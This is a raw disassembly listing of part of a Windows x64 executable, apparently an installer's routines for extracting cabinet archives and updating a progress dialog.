   140005810:	eb 05                	jmp    0x140005817
   140005812:	42 03 54 11 10       	add    0x10(%rcx,%r10,1),%edx
   140005817:	42 89 54 11 10       	mov    %edx,0x10(%rcx,%r10,1)
   14000581c:	eb 3e                	jmp    0x14000585c
   14000581e:	45 85 c0             	test   %r8d,%r8d
   140005821:	74 17                	je     0x14000583a
   140005823:	45 2b c1             	sub    %r9d,%r8d
   140005826:	74 15                	je     0x14000583d
   140005828:	45 3b c1             	cmp    %r9d,%r8d
   14000582b:	74 05                	je     0x140005832
   14000582d:	83 c8 ff             	or     $0xffffffff,%eax
   140005830:	eb 2c                	jmp    0x14000585e
   140005832:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140005838:	eb 03                	jmp    0x14000583d
   14000583a:	45 33 c9             	xor    %r9d,%r9d
   14000583d:	4a 8b 4c 11 18       	mov    0x18(%rcx,%r10,1),%rcx
   140005842:	45 33 c0             	xor    %r8d,%r8d
   140005845:	48 ff 15 94 3a 00 00 	rex.W call *0x3a94(%rip)        # 0x1400092e0
   14000584c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005851:	8b d0                	mov    %eax,%edx
   140005853:	83 c8 ff             	or     $0xffffffff,%eax
   140005856:	83 fa ff             	cmp    $0xffffffff,%edx
   140005859:	0f 44 d0             	cmove  %eax,%edx
   14000585c:	8b c2                	mov    %edx,%eax
   14000585e:	48 83 c4 28          	add    $0x28,%rsp
   140005862:	c3                   	ret
   140005863:	cc                   	int3
   140005864:	cc                   	int3
   140005865:	cc                   	int3
   140005866:	cc                   	int3
   140005867:	cc                   	int3
   140005868:	cc                   	int3
   140005869:	cc                   	int3
   14000586a:	cc                   	int3
   14000586b:	cc                   	int3
   14000586c:	cc                   	int3
   14000586d:	cc                   	int3
   14000586e:	cc                   	int3
   14000586f:	cc                   	int3
   140005870:	8b d1                	mov    %ecx,%edx
   140005872:	33 c9                	xor    %ecx,%ecx
   140005874:	48 ff 25 ad 39 00 00 	rex.W jmp *0x39ad(%rip)        # 0x140009228
   14000587b:	cc                   	int3
   14000587c:	cc                   	int3
   14000587d:	cc                   	int3
   14000587e:	cc                   	int3
   14000587f:	cc                   	int3
   140005880:	cc                   	int3
   140005881:	cc                   	int3
   140005882:	cc                   	int3
   140005883:	cc                   	int3
   140005884:	cc                   	int3
   140005885:	cc                   	int3
   140005886:	cc                   	int3
   140005887:	cc                   	int3
   140005888:	cc                   	int3
   140005889:	cc                   	int3
   14000588a:	cc                   	int3
   14000588b:	cc                   	int3
   14000588c:	cc                   	int3
   14000588d:	cc                   	int3
   14000588e:	cc                   	int3
   14000588f:	cc                   	int3
   140005890:	48 ff 25 99 39 00 00 	rex.W jmp *0x3999(%rip)        # 0x140009230
   140005897:	cc                   	int3
   140005898:	cc                   	int3
   140005899:	cc                   	int3
   14000589a:	cc                   	int3
   14000589b:	cc                   	int3
   14000589c:	cc                   	int3
   14000589d:	cc                   	int3
   14000589e:	cc                   	int3
   14000589f:	cc                   	int3
   1400058a0:	cc                   	int3
   1400058a1:	cc                   	int3
   1400058a2:	cc                   	int3
   1400058a3:	cc                   	int3
   1400058a4:	cc                   	int3
   1400058a5:	cc                   	int3
   1400058a6:	cc                   	int3
   1400058a7:	cc                   	int3
   1400058a8:	cc                   	int3
   1400058a9:	cc                   	int3
   1400058aa:	cc                   	int3
   1400058ab:	cc                   	int3
   1400058ac:	cc                   	int3
   1400058ad:	cc                   	int3
   1400058ae:	cc                   	int3
   1400058af:	cc                   	int3
   1400058b0:	48 8b c4             	mov    %rsp,%rax
   1400058b3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400058b7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400058bb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400058bf:	55                   	push   %rbp
   1400058c0:	41 56                	push   %r14
   1400058c2:	41 57                	push   %r15
   1400058c4:	48 8d 68 98          	lea    -0x68(%rax),%rbp
   1400058c8:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   1400058cf:	48 8b 05 32 67 00 00 	mov    0x6732(%rip),%rax        # 0x14000c008
   1400058d6:	48 33 c4             	xor    %rsp,%rax
   1400058d9:	48 89 45 40          	mov    %rax,0x40(%rbp)
   1400058dd:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   1400058e1:	33 f6                	xor    %esi,%esi
   1400058e3:	39 35 13 7d 00 00    	cmp    %esi,0x7d13(%rip)        # 0x14000d5fc
   1400058e9:	48 8b da             	mov    %rdx,%rbx
   1400058ec:	74 16                	je     0x140005904
   1400058ee:	83 f9 03             	cmp    $0x3,%ecx
   1400058f1:	75 09                	jne    0x1400058fc
   1400058f3:	48 8b 4a 28          	mov    0x28(%rdx),%rcx
   1400058f7:	e8 74 fe ff ff       	call   0x140005770
   1400058fc:	49 8b c6             	mov    %r14,%rax
   1400058ff:	e9 e4 01 00 00       	jmp    0x140005ae8
   140005904:	85 c9                	test   %ecx,%ecx
   140005906:	0f 84 d2 01 00 00    	je     0x140005ade
   14000590c:	83 e9 01             	sub    $0x1,%ecx
   14000590f:	74 13                	je     0x140005924
   140005911:	83 e9 01             	sub    $0x1,%ecx
   140005914:	0f 84 0f 01 00 00    	je     0x140005a29
   14000591a:	83 e9 01             	sub    $0x1,%ecx
   14000591d:	74 0c                	je     0x14000592b
   14000591f:	83 f9 01             	cmp    $0x1,%ecx
   140005922:	74 d8                	je     0x1400058fc
   140005924:	33 c0                	xor    %eax,%eax
   140005926:	e9 bd 01 00 00       	jmp    0x140005ae8
   14000592b:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   14000592f:	49 8b c6             	mov    %r14,%rax
   140005932:	48 ff c0             	inc    %rax
   140005935:	41 38 34 00          	cmp    %sil,(%r8,%rax,1)
   140005939:	75 f7                	jne    0x140005932
   14000593b:	48 8d 15 ce 7c 00 00 	lea    0x7cce(%rip),%rdx        # 0x14000d610
   140005942:	49 8b ce             	mov    %r14,%rcx
   140005945:	48 ff c1             	inc    %rcx
   140005948:	40 38 34 0a          	cmp    %sil,(%rdx,%rcx,1)
   14000594c:	75 f7                	jne    0x140005945
   14000594e:	ff c0                	inc    %eax
   140005950:	03 c1                	add    %ecx,%eax
   140005952:	3d 04 01 00 00       	cmp    $0x104,%eax
   140005957:	7d a3                	jge    0x1400058fc
   140005959:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000595e:	e8 c9 f7 ff ff       	call   0x14000512c
   140005963:	85 c0                	test   %eax,%eax
   140005965:	74 95                	je     0x1400058fc
   140005967:	48 8b 7b 28          	mov    0x28(%rbx),%rdi
   14000596b:	4c 8d 3d ce 76 00 00 	lea    0x76ce(%rip),%r15        # 0x14000d040
   140005972:	48 c1 e7 05          	shl    $0x5,%rdi
   140005976:	42 83 7c 3f 04 01    	cmpl   $0x1,0x4(%rdi,%r15,1)
   14000597c:	0f 84 7a ff ff ff    	je     0x1400058fc
   140005982:	0f b7 53 32          	movzwl 0x32(%rbx),%edx
   140005986:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   14000598b:	0f b7 4b 30          	movzwl 0x30(%rbx),%ecx
   14000598f:	48 ff 15 12 3a 00 00 	rex.W call *0x3a12(%rip)        # 0x1400093a8
   140005996:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000599b:	85 c0                	test   %eax,%eax
   14000599d:	0f 84 59 ff ff ff    	je     0x1400058fc
   1400059a3:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400059a8:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400059ad:	48 ff 15 7c 39 00 00 	rex.W call *0x397c(%rip)        # 0x140009330
   1400059b4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400059b9:	85 c0                	test   %eax,%eax
   1400059bb:	0f 84 3b ff ff ff    	je     0x1400058fc
   1400059c1:	4a 8b 4c 3f 18       	mov    0x18(%rdi,%r15,1),%rcx
   1400059c6:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   1400059cb:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400059d0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400059d5:	48 ff 15 fc 38 00 00 	rex.W call *0x38fc(%rip)        # 0x1400092d8
   1400059dc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400059e1:	85 c0                	test   %eax,%eax
   1400059e3:	0f 84 13 ff ff ff    	je     0x1400058fc
   1400059e9:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   1400059ed:	e8 7e fd ff ff       	call   0x140005770
   1400059f2:	66 39 73 34          	cmp    %si,0x34(%rbx)
   1400059f6:	75 07                	jne    0x1400059ff
   1400059f8:	ba 80 00 00 00       	mov    $0x80,%edx
   1400059fd:	eb 07                	jmp    0x140005a06
   1400059ff:	0f b7 53 34          	movzwl 0x34(%rbx),%edx
   140005a03:	83 e2 27             	and    $0x27,%edx
   140005a06:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005a0b:	48 ff 15 46 38 00 00 	rex.W call *0x3846(%rip)        # 0x140009258
   140005a12:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005a17:	85 c0                	test   %eax,%eax
   140005a19:	0f 84 dd fe ff ff    	je     0x1400058fc
   140005a1f:	b8 01 00 00 00       	mov    $0x1,%eax
   140005a24:	e9 bf 00 00 00       	jmp    0x140005ae8
   140005a29:	48 8b 0d f8 6d 00 00 	mov    0x6df8(%rip),%rcx        # 0x14000c828
   140005a30:	48 85 c9             	test   %rcx,%rcx
   140005a33:	74 15                	je     0x140005a4a
   140005a35:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   140005a39:	ba 37 08 00 00       	mov    $0x837,%edx
   140005a3e:	48 ff 15 13 3b 00 00 	rex.W call *0x3b13(%rip)        # 0x140009558
   140005a45:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005a4a:	4c 8b 43 08          	mov    0x8(%rbx),%r8
   140005a4e:	49 8b c6             	mov    %r14,%rax
   140005a51:	48 ff c0             	inc    %rax
   140005a54:	41 38 34 00          	cmp    %sil,(%r8,%rax,1)
   140005a58:	75 f7                	jne    0x140005a51
   140005a5a:	48 8d 15 af 7b 00 00 	lea    0x7baf(%rip),%rdx        # 0x14000d610
   140005a61:	49 8b ce             	mov    %r14,%rcx
   140005a64:	48 ff c1             	inc    %rcx
   140005a67:	40 38 34 0a          	cmp    %sil,(%rdx,%rcx,1)
   140005a6b:	75 f7                	jne    0x140005a64
   140005a6d:	ff c0                	inc    %eax
   140005a6f:	03 c1                	add    %ecx,%eax
   140005a71:	3d 04 01 00 00       	cmp    $0x104,%eax
   140005a76:	0f 8d 80 fe ff ff    	jge    0x1400058fc
   140005a7c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005a81:	e8 a6 f6 ff ff       	call   0x14000512c
   140005a86:	85 c0                	test   %eax,%eax
   140005a88:	0f 84 6e fe ff ff    	je     0x1400058fc
   140005a8e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005a93:	e8 24 f7 ff ff       	call   0x1400051bc
   140005a98:	85 c0                	test   %eax,%eax
   140005a9a:	0f 84 84 fe ff ff    	je     0x140005924
   140005aa0:	ba 02 83 00 00       	mov    $0x8302,%edx
   140005aa5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005aaa:	41 b8 80 01 00 00    	mov    $0x180,%r8d
   140005ab0:	e8 cb f8 ff ff       	call   0x140005380
   140005ab5:	48 8b d8             	mov    %rax,%rbx
   140005ab8:	49 3b c6             	cmp    %r14,%rax
   140005abb:	0f 84 3b fe ff ff    	je     0x1400058fc
   140005ac1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005ac6:	e8 b1 f7 ff ff       	call   0x14000527c
   140005acb:	85 c0                	test   %eax,%eax
   140005acd:	0f 84 29 fe ff ff    	je     0x1400058fc
   140005ad3:	ff 05 47 7d 00 00    	incl   0x7d47(%rip)        # 0x14000d820
   140005ad9:	48 8b c3             	mov    %rbx,%rax
   140005adc:	eb 0a                	jmp    0x140005ae8
   140005ade:	48 8b cb             	mov    %rbx,%rcx
   140005ae1:	e8 32 00 00 00       	call   0x140005b18
   140005ae6:	48 98                	cltq
   140005ae8:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   140005aec:	48 33 cc             	xor    %rsp,%rcx
   140005aef:	e8 7c 29 00 00       	call   0x140008470
   140005af4:	4c 8d 9c 24 50 01 00 	lea    0x150(%rsp),%r11
   140005afb:	00 
   140005afc:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140005b00:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140005b04:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   140005b08:	49 8b e3             	mov    %r11,%rsp
   140005b0b:	41 5f                	pop    %r15
   140005b0d:	41 5e                	pop    %r14
   140005b0f:	5d                   	pop    %rbp
   140005b10:	c3                   	ret
   140005b11:	cc                   	int3
   140005b12:	cc                   	int3
   140005b13:	cc                   	int3
   140005b14:	cc                   	int3
   140005b15:	cc                   	int3
   140005b16:	cc                   	int3
   140005b17:	cc                   	int3
   140005b18:	4c 8b d1             	mov    %rcx,%r10
   140005b1b:	48 8d 05 1a 7d 00 00 	lea    0x7d1a(%rip),%rax        # 0x14000d83c
   140005b22:	b9 06 00 00 00       	mov    $0x6,%ecx
   140005b27:	48 8d 15 1e 80 00 00 	lea    0x801e(%rip),%rdx        # 0x14000db4c
   140005b2e:	44 8d 41 7a          	lea    0x7a(%rcx),%r8d
   140005b32:	0f 10 02             	movups (%rdx),%xmm0
   140005b35:	0f 11 00             	movups %xmm0,(%rax)
   140005b38:	0f 10 4a 10          	movups 0x10(%rdx),%xmm1
   140005b3c:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   140005b40:	0f 10 42 20          	movups 0x20(%rdx),%xmm0
   140005b44:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   140005b48:	0f 10 4a 30          	movups 0x30(%rdx),%xmm1
   140005b4c:	0f 11 48 30          	movups %xmm1,0x30(%rax)
   140005b50:	0f 10 42 40          	movups 0x40(%rdx),%xmm0
   140005b54:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140005b58:	0f 10 4a 50          	movups 0x50(%rdx),%xmm1
   140005b5c:	0f 11 48 50          	movups %xmm1,0x50(%rax)
   140005b60:	0f 10 42 60          	movups 0x60(%rdx),%xmm0
   140005b64:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   140005b68:	49 03 c0             	add    %r8,%rax
   140005b6b:	0f 10 4a 70          	movups 0x70(%rdx),%xmm1
   140005b6f:	49 03 d0             	add    %r8,%rdx
   140005b72:	0f 11 48 f0          	movups %xmm1,-0x10(%rax)
   140005b76:	48 83 e9 01          	sub    $0x1,%rcx
   140005b7a:	75 b6                	jne    0x140005b32
   140005b7c:	0f 10 02             	movups (%rdx),%xmm0
   140005b7f:	ba 04 01 00 00       	mov    $0x104,%edx
   140005b84:	48 8d 0d c1 7f 00 00 	lea    0x7fc1(%rip),%rcx        # 0x14000db4c
   140005b8b:	44 8b c2             	mov    %edx,%r8d
   140005b8e:	45 33 db             	xor    %r11d,%r11d
   140005b91:	0f 11 00             	movups %xmm0,(%rax)
   140005b94:	4d 8b 4a 18          	mov    0x18(%r10),%r9
   140005b98:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140005b9f:	48 85 c0             	test   %rax,%rax
   140005ba2:	74 15                	je     0x140005bb9
   140005ba4:	41 8a 01             	mov    (%r9),%al
   140005ba7:	84 c0                	test   %al,%al
   140005ba9:	74 0e                	je     0x140005bb9
   140005bab:	88 01                	mov    %al,(%rcx)
   140005bad:	49 ff c1             	inc    %r9
   140005bb0:	48 ff c1             	inc    %rcx
   140005bb3:	49 83 e8 01          	sub    $0x1,%r8
   140005bb7:	75 df                	jne    0x140005b98
   140005bb9:	4d 85 c0             	test   %r8,%r8
   140005bbc:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140005bc0:	4c 8b c2             	mov    %rdx,%r8
   140005bc3:	48 0f 45 c1          	cmovne %rcx,%rax
   140005bc7:	48 8d 0d 82 80 00 00 	lea    0x8082(%rip),%rcx        # 0x14000dc50
   140005bce:	44 88 18             	mov    %r11b,(%rax)
   140005bd1:	4d 8b 4a 08          	mov    0x8(%r10),%r9
   140005bd5:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140005bdc:	48 85 c0             	test   %rax,%rax
   140005bdf:	74 15                	je     0x140005bf6
   140005be1:	41 8a 01             	mov    (%r9),%al
   140005be4:	84 c0                	test   %al,%al
   140005be6:	74 0e                	je     0x140005bf6
   140005be8:	88 01                	mov    %al,(%rcx)
   140005bea:	49 ff c1             	inc    %r9
   140005bed:	48 ff c1             	inc    %rcx
   140005bf0:	49 83 e8 01          	sub    $0x1,%r8
   140005bf4:	75 df                	jne    0x140005bd5
   140005bf6:	4d 85 c0             	test   %r8,%r8
   140005bf9:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140005bfd:	48 0f 45 c1          	cmovne %rcx,%rax
   140005c01:	48 8d 0d 4c 81 00 00 	lea    0x814c(%rip),%rcx        # 0x14000dd54
   140005c08:	44 88 18             	mov    %r11b,(%rax)
   140005c0b:	4d 8b 42 10          	mov    0x10(%r10),%r8
   140005c0f:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140005c16:	48 85 c0             	test   %rax,%rax
   140005c19:	74 15                	je     0x140005c30
   140005c1b:	41 8a 00             	mov    (%r8),%al
   140005c1e:	84 c0                	test   %al,%al
   140005c20:	74 0e                	je     0x140005c30
   140005c22:	88 01                	mov    %al,(%rcx)
   140005c24:	49 ff c0             	inc    %r8
   140005c27:	48 ff c1             	inc    %rcx
   140005c2a:	48 83 ea 01          	sub    $0x1,%rdx
   140005c2e:	75 df                	jne    0x140005c0f
   140005c30:	48 85 d2             	test   %rdx,%rdx
   140005c33:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140005c37:	48 0f 45 c1          	cmovne %rcx,%rax
   140005c3b:	44 88 18             	mov    %r11b,(%rax)
   140005c3e:	41 0f b7 42 36       	movzwl 0x36(%r10),%eax
   140005c43:	66 89 05 0e 82 00 00 	mov    %ax,0x820e(%rip)        # 0x14000de58
   140005c4a:	41 0f b7 42 38       	movzwl 0x38(%r10),%eax
   140005c4f:	66 89 05 04 82 00 00 	mov    %ax,0x8204(%rip)        # 0x14000de5a
   140005c56:	33 c0                	xor    %eax,%eax
   140005c58:	c3                   	ret
   140005c59:	cc                   	int3
   140005c5a:	cc                   	int3
   140005c5b:	cc                   	int3
   140005c5c:	cc                   	int3
   140005c5d:	cc                   	int3
   140005c5e:	cc                   	int3
   140005c5f:	cc                   	int3
   140005c60:	4c 8b dc             	mov    %rsp,%r11
   140005c63:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   140005c67:	57                   	push   %rdi
   140005c68:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140005c6f:	48 8b 05 92 63 00 00 	mov    0x6392(%rip),%rax        # 0x14000c008
   140005c76:	48 33 c4             	xor    %rsp,%rax
   140005c79:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140005c7e:	33 c0                	xor    %eax,%eax
   140005c80:	4c 8d 0d 59 f9 ff ff 	lea    -0x6a7(%rip),%r9        # 0x1400055e0
   140005c87:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005c8a:	4c 8d 05 ef f6 ff ff 	lea    -0x911(%rip),%r8        # 0x140005380
   140005c91:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140005c96:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140005c9a:	48 8d 15 ef fb ff ff 	lea    -0x411(%rip),%rdx        # 0x140005890
   140005ca1:	49 8d 43 e0          	lea    -0x20(%r11),%rax
   140005ca5:	49 89 43 b8          	mov    %rax,-0x48(%r11)
   140005ca9:	48 8d 0d c0 fb ff ff 	lea    -0x440(%rip),%rcx        # 0x140005870
   140005cb0:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140005cb7:	00 
   140005cb8:	48 8d 05 21 fb ff ff 	lea    -0x4df(%rip),%rax        # 0x1400057e0
   140005cbf:	49 89 43 a8          	mov    %rax,-0x58(%r11)
   140005cc3:	48 8d 05 a6 fa ff ff 	lea    -0x55a(%rip),%rax        # 0x140005770
   140005cca:	49 89 43 a0          	mov    %rax,-0x60(%r11)
   140005cce:	48 8d 05 bb f9 ff ff 	lea    -0x645(%rip),%rax        # 0x140005690
   140005cd5:	49 89 43 98          	mov    %rax,-0x68(%r11)
   140005cd9:	48 ff 15 d0 34 00 00 	rex.W call *0x34d0(%rip)        # 0x1400091b0
   140005ce0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005ce5:	48 8b f8             	mov    %rax,%rdi
   140005ce8:	48 85 c0             	test   %rax,%rax
   140005ceb:	74 7c                	je     0x140005d69
   140005ced:	ba 00 80 00 00       	mov    $0x8000,%edx
   140005cf2:	48 8d 0d 07 65 00 00 	lea    0x6507(%rip),%rcx        # 0x14000c200
   140005cf9:	41 b8 80 01 00 00    	mov    $0x180,%r8d
   140005cff:	e8 7c f6 ff ff       	call   0x140005380
   140005d04:	48 8b d8             	mov    %rax,%rbx
   140005d07:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005d0b:	74 5c                	je     0x140005d69
   140005d0d:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140005d12:	48 8b d0             	mov    %rax,%rdx
   140005d15:	48 8b cf             	mov    %rdi,%rcx
   140005d18:	48 ff 15 99 34 00 00 	rex.W call *0x3499(%rip)        # 0x1400091b8
   140005d1f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005d24:	85 c0                	test   %eax,%eax
   140005d26:	74 41                	je     0x140005d69
   140005d28:	8b 05 3a 78 00 00    	mov    0x783a(%rip),%eax        # 0x14000d568
   140005d2e:	39 44 24 50          	cmp    %eax,0x50(%rsp)
   140005d32:	75 35                	jne    0x140005d69
   140005d34:	83 7c 24 60 00       	cmpl   $0x0,0x60(%rsp)
   140005d39:	75 2e                	jne    0x140005d69
   140005d3b:	83 7c 24 64 00       	cmpl   $0x0,0x64(%rsp)
   140005d40:	75 27                	jne    0x140005d69
   140005d42:	48 8b cb             	mov    %rbx,%rcx
   140005d45:	e8 26 fa ff ff       	call   0x140005770
   140005d4a:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005d4d:	74 1a                	je     0x140005d69
   140005d4f:	48 8b cf             	mov    %rdi,%rcx
   140005d52:	48 ff 15 67 34 00 00 	rex.W call *0x3467(%rip)        # 0x1400091c0
   140005d59:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005d5e:	85 c0                	test   %eax,%eax
   140005d60:	74 07                	je     0x140005d69
   140005d62:	b8 01 00 00 00       	mov    $0x1,%eax
   140005d67:	eb 02                	jmp    0x140005d6b
   140005d69:	33 c0                	xor    %eax,%eax
   140005d6b:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140005d70:	48 33 cc             	xor    %rsp,%rcx
   140005d73:	e8 f8 26 00 00       	call   0x140008470
   140005d78:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140005d7f:	00 
   140005d80:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140005d87:	5f                   	pop    %rdi
   140005d88:	c3                   	ret
   140005d89:	cc                   	int3
   140005d8a:	cc                   	int3
   140005d8b:	cc                   	int3
   140005d8c:	cc                   	int3
   140005d8d:	cc                   	int3
   140005d8e:	cc                   	int3
   140005d8f:	cc                   	int3
   140005d90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005d95:	57                   	push   %rdi
   140005d96:	48 83 ec 50          	sub    $0x50,%rsp
   140005d9a:	45 33 c0             	xor    %r8d,%r8d
   140005d9d:	48 8d 0d 9c 3b 00 00 	lea    0x3b9c(%rip),%rcx        # 0x140009940
   140005da4:	33 d2                	xor    %edx,%edx
   140005da6:	e8 a5 f2 ff ff       	call   0x140005050
   140005dab:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140005db1:	89 05 b1 77 00 00    	mov    %eax,0x77b1(%rip)        # 0x14000d568
   140005db7:	48 8d 15 82 3b 00 00 	lea    0x3b82(%rip),%rdx        # 0x140009940
   140005dbe:	33 c9                	xor    %ecx,%ecx
   140005dc0:	48 ff 15 21 35 00 00 	rex.W call *0x3521(%rip)        # 0x1400092e8
   140005dc7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005dcc:	48 8b d0             	mov    %rax,%rdx
   140005dcf:	33 c9                	xor    %ecx,%ecx
   140005dd1:	48 ff 15 a0 35 00 00 	rex.W call *0x35a0(%rip)        # 0x140009378
   140005dd8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005ddd:	48 8b c8             	mov    %rax,%rcx
   140005de0:	48 ff 15 71 35 00 00 	rex.W call *0x3571(%rip)        # 0x140009358
   140005de7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005dec:	48 89 05 6d 77 00 00 	mov    %rax,0x776d(%rip)        # 0x14000d560
   140005df3:	48 85 c0             	test   %rax,%rax
   140005df6:	0f 84 d5 01 00 00    	je     0x140005fd1
   140005dfc:	48 8b 0d 25 6a 00 00 	mov    0x6a25(%rip),%rcx        # 0x14000c828
   140005e03:	48 85 c9             	test   %rcx,%rcx
   140005e06:	74 4e                	je     0x140005e56
   140005e08:	ba 42 08 00 00       	mov    $0x842,%edx
   140005e0d:	48 ff 15 dc 36 00 00 	rex.W call *0x36dc(%rip)        # 0x1400094f0
   140005e14:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005e19:	48 8b c8             	mov    %rax,%rcx
   140005e1c:	33 d2                	xor    %edx,%edx
   140005e1e:	48 ff 15 6b 36 00 00 	rex.W call *0x366b(%rip)        # 0x140009490
   140005e25:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005e2a:	48 8b 0d f7 69 00 00 	mov    0x69f7(%rip),%rcx        # 0x14000c828
   140005e31:	ba 41 08 00 00       	mov    $0x841,%edx
   140005e36:	48 ff 15 b3 36 00 00 	rex.W call *0x36b3(%rip)        # 0x1400094f0
   140005e3d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005e42:	48 8b c8             	mov    %rax,%rcx
   140005e45:	ba 05 00 00 00       	mov    $0x5,%edx
   140005e4a:	48 ff 15 3f 36 00 00 	rex.W call *0x363f(%rip)        # 0x140009490
   140005e51:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005e56:	e8 05 fe ff ff       	call   0x140005c60
   140005e5b:	85 c0                	test   %eax,%eax
   140005e5d:	75 0a                	jne    0x140005e69
   140005e5f:	ba ba 04 00 00       	mov    $0x4ba,%edx
   140005e64:	e9 cb 00 00 00       	jmp    0x140005f34
   140005e69:	48 8d 05 fc 76 00 00 	lea    0x76fc(%rip),%rax        # 0x14000d56c
   140005e70:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140005e75:	4c 8d 0d 64 f7 ff ff 	lea    -0x89c(%rip),%r9        # 0x1400055e0
   140005e7c:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140005e83:	00 
   140005e84:	48 8d 05 55 f9 ff ff 	lea    -0x6ab(%rip),%rax        # 0x1400057e0
   140005e8b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005e90:	4c 8d 05 e9 f4 ff ff 	lea    -0xb17(%rip),%r8        # 0x140005380
   140005e97:	48 8d 05 d2 f8 ff ff 	lea    -0x72e(%rip),%rax        # 0x140005770
   140005e9e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005ea3:	48 8d 15 e6 f9 ff ff 	lea    -0x61a(%rip),%rdx        # 0x140005890
   140005eaa:	48 8d 05 df f7 ff ff 	lea    -0x821(%rip),%rax        # 0x140005690
   140005eb1:	48 8d 0d b8 f9 ff ff 	lea    -0x648(%rip),%rcx        # 0x140005870
   140005eb8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005ebd:	48 ff 15 ec 32 00 00 	rex.W call *0x32ec(%rip)        # 0x1400091b0
   140005ec4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005ec9:	48 8b f8             	mov    %rax,%rdi
   140005ecc:	48 85 c0             	test   %rax,%rax
   140005ecf:	74 57                	je     0x140005f28
   140005ed1:	48 8d 05 88 76 00 00 	lea    0x7688(%rip),%rax        # 0x14000d560
   140005ed8:	45 33 c9             	xor    %r9d,%r9d
   140005edb:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005ee0:	4c 8d 05 19 38 00 00 	lea    0x3819(%rip),%r8        # 0x140009700
   140005ee7:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140005eed:	48 8d 05 bc f9 ff ff 	lea    -0x644(%rip),%rax        # 0x1400058b0
   140005ef4:	48 8d 15 05 63 00 00 	lea    0x6305(%rip),%rdx        # 0x14000c200
   140005efb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005f00:	48 8b cf             	mov    %rdi,%rcx
   140005f03:	48 ff 15 be 32 00 00 	rex.W call *0x32be(%rip)        # 0x1400091c8
   140005f0a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005f0f:	8b d8                	mov    %eax,%ebx
   140005f11:	85 c0                	test   %eax,%eax
   140005f13:	74 40                	je     0x140005f55
   140005f15:	48 8b cf             	mov    %rdi,%rcx
